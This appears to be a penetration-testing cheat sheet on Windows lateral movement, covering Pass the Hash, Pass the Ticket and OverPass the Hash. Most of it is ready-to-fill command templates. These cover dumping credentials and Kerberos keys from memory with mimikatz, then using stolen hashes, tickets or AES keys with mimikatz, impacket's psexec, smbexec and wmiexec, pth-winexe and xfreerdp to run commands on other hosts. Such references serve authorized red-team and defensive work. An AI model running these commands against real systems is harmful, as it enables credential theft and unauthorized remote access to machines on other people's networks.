# Pass The Hash

## Pass the Hash

Use the hash to login in another machine as a local user without knowing its password. Works because NTLM hashes are static so if a user logs into different machines his hash will remain the same on each host.

* NTLM based
* Requires the SMB port to be reachable on the target
* The user/service must have admin rights on the target machine

```
lsadump::sam 
lsadump::lsa /inject /name:<user>
sekurlsa::logonpasswords
```

### Exploit

{% tabs %}
{% tab title="Windows" %}
```javascript
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM or :NT> /run:<cmd>
```
{% endtab %}

{% tab title="Linux" %}
```bash
pth-winexe -U <domain>/<user>%<NTLM> //<target ip> cmd

#impacket
python smbexec.py <user>@<ip> -hashes <NTLM or :NT>
python psexec.py <user>@<ip> -hashes <NTLM or :NT>
python wmiexec.py <user>@<ip> -hashes <NTLM or :NT>

#rdp
xfreerdp /u:Administrator /pth:<ntlm> /d:<domain> /v:<target>
```
{% endtab %}
{% endtabs %}

## Pass the Ticket

Loads a ticket in memory granting the current user access to the remote machine/service within the context of the current session.

* Kerberos based
* Alternative to PTH if NTLM authentication is disabled
* Can be exploited even if the current user/service is not an admin on the target machine

```
sekurlsa::tickets /export
```

### Exploit

{% tabs %}
{% tab title="Windows" %}
```javascript
kerberos::ptt <.krbi file>

//in terminal
.\PsExec.exe -accepteula \\<target host> <cmd>
dir \\<host>\c$
```
{% endtab %}

{% tab title="Linux" %}
```bash
#convert and store the ticket file for impacket use
python ticket_converter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=<.ccache file path>

#start remote connection
python psexec.py <domain>/<user>@<host> -k -no-pass
python smbexec.py <domain>/<user>@<host> -k -no-pass
python wmiexec.py <domain>/<user>@<host> -k -no-pass
```
{% endtab %}
{% endtabs %}

## OverPass the Hash / Pass the Key

Obtain a TGT ticket by providing a valid NTLM hash, AES keys, DES keys or password. The obtained TGT token can then be used to access other machines.

* Kerberos Based
* Alternative to PTH if NTLM authentication is disabled
* Can be exploited starting from NTLM, secret keys or password (see [password to NTLM](local-credentials/#ntlm-from-password))
* Can be exploited even if the current user/service is not an admin on the target machine
* Requests a new TGT, as such the attack is not limited to the tickets stored in memory

```
#DES, AES128 and AES256 keys
sekurlsa::ekeys

#NTLM
lsadump::sam 
lsadump::lsa /inject /name:<user>
sekurlsa::logonpasswords
```

### Exploit

{% tabs %}
{% tab title="Windows" %}
```javascript
#Run command
sekurlsa::pth /user:<user> /domain:<domain> /aes128:<hash> /run:"<cmd>"    #from AES128 key
sekurlsa::pth /user:<user> /domain:<domain> /aes256:<hash> /run:"<cmd>"    #from AES256 key
sekurlsa::pth /user:<user> /domain:<domain> /des:<hash> /run:"<cmd>"       #from DES key
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:"<cmd>"      #from NTLM
sekurlsa::pth /user:<user> /domain:<domain> /rc4:<NT hash> /run:"<cmd>"    #from NT

#Pivoting
klist #verify the creation of the ticket

.\PsExec.exe -accepteula \\<target host> <cmd>
dir \\<host>\c$
```
{% endtab %}

{% tab title="Linux" %}
```bash
python getTGT.py <domain_name>/<user_name> -hashes <NTLM hash>
python getTGT.py <domain_name>/<user_name> -hashes :<NT hash>
python getTGT.py <domain_name>/<user_name> -aesKey <AES>
python getTGT.py <domain_name>/<user_name>:<password>

export KRB5CCNAME=<ccache file>

#start remote connection
python psexec.py <domain>/<user>@<host> -k -no-pass
python smbexec.py <domain>/<user>@<host> -k -no-pass
python wmiexec.py <domain>/<user>@<host> -k -no-pass
```
{% endtab %}
{% endtabs %}
